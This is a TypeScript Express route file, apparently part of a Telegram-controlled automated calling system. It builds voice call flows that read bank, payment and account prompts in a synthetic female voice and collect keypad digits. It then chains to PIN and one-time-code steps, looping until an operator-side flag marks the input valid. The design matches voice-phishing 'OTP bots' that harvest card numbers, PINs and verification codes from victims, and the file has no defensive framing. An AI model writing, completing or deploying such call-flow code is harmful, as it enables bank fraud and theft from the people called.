import { app } from '..';
import { bot } from '../..';
import { v4 as uuidv4 } from 'uuid';
import { getLangVerifyInput } from '../../languages';
import { Language } from '../../types';

app.all(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
  const { language, step, chatId, loop } = req.params;
  const { askCardInfo, cardType, otpLength } = req.query;

  // @ts-expect-error it will exist
  const { valid } = Object.keys(bot.context).length
    ? bot.context
    : {
        valid: undefined,
      };
  const l = Number(loop) < 4 ? Number(loop) + 1 : 4;

  if ((!(l < 4) && valid === `undifined`) || valid) {
    switch (step) {
      case `bank`:
        res.json({
          id: uuidv4(),
          title: `call BANK STEP - ${chatId}`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: getLangVerifyInput({
                  language: language as Language,
                  step: `bank`,
                  cardType: cardType !== 'undefined' ? String(cardType) : ``,
                }),
                language,
                voice: 'female',
              },
              onKeypressGoto: 'nextStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 8,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 8,
            },
            {
              id: 'nextStepGoto',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
              },
            },
          ],
        });
        // @ts-expect-error I can do this
        bot.context = {};
        return;

      case `pay`:
        res.json({
          id: uuidv4(),
          title: `call PAY STEP - ${chatId}`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: getLangVerifyInput({
                  language: language as Language,
                  step: `pay`,
                  cardType: cardType !== 'undefined' ? String(cardType) : ``,
                }),
                language,
                voice: 'female',
              },
              onKeypressGoto: 'nextStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 8,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 8,
            },
            {
              id: 'nextStepGoto',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
              },
            },
          ],
        });
        // @ts-expect-error I can do this
        bot.context = {};
        return;
      case `account`:
        if (askCardInfo === 'yes') {
          res.json({
            id: uuidv4(),
            title: `call PAY STEP - ${chatId}`,
            record: false,
            steps: [
              {
                id: uuidv4(),
                action: 'say',
                options: {
                  payload: getLangVerifyInput({
                    language: language as Language,
                    step: `account`,
                    sp: `1`,
                    cardType: cardType !== 'undefined' ? String(cardType) : ``,
                  }),
                  language,
                  voice: 'female',
                },
                onKeypressGoto: 'nextStepGoto',
                onKeypressVar: 'dtmf',
                endKey: '#',
                maxNumKeys: 18,
              },
              {
                id: uuidv4(),
                action: 'pause',
                options: {
                  length: 5,
                },
                onKeypressGoto: 'nextStepGoto',
                onKeypressVar: 'dtmf',
                endKey: '#',
                maxNumKeys: 18,
              },
              {
                id: 'nextStepGoto',
                action: 'fetchCallFlow',
                options: {
                  url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes&otpLength=${otpLength}`,
                },
              },
            ],
          });
          // @ts-expect-error I can do this
          bot.context = {};
          return;
        } else {
          res.json({
            id: uuidv4(),
            title: `call bank - ${chatId} no OTP`,
            record: false,
            steps: [
              {
                id: uuidv4(),
                action: 'say',
                options: {
                  payload: getLangVerifyInput({
                    language: language as Language,
                    step: `account`,
                    sp: `2`,
                    cardType: cardType !== 'undefined' ? String(cardType) : ``,
                  }),
                  language,
                  voice: 'female',
                },
              },
            ],
          });
          // @ts-expect-error I can do this
          bot.context = {};
          return;
        }

      default:
        return;
    }
  }

  if (valid === false) {
    res.json({
      id: uuidv4(),
      title: `call ACCOUNT STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangVerifyInput({
              language: language as Language,
              step: `shared`,
              sp: `1`,
              cardType: cardType !== 'undefined' ? String(cardType) : ``,
            }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}&cardType=${cardType}&otpLength=${otpLength}`,
          },
        },
      ],
    });
    // @ts-expect-error I can do this
    bot.context = {};
    return;
  }

  res.json({
    id: uuidv4(),
    title: `call ACCOUNT STEP - ${chatId}`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload: getLangVerifyInput({
            language: language as Language,
            step: `shared`,
            sp: `2`,
            cardType: cardType !== 'undefined' ? String(cardType) : ``,
          }),
          language,
          voice: 'female',
        },
      },
      {
        id: uuidv4(),
        action: 'pause',
        options: {
          length: 5,
        },
      },
      {
        id: 'nextStepGoto',
        action: 'fetchCallFlow',
        options: {
          url: `${process.env.ENDPOINT_URL}/verify_input/${step}/${language}/${chatId}/${l}?otpLength=${otpLength}`,
        },
      },
    ],
  });

  // @ts-expect-error I can do this
  bot.context = {};
  return;
});
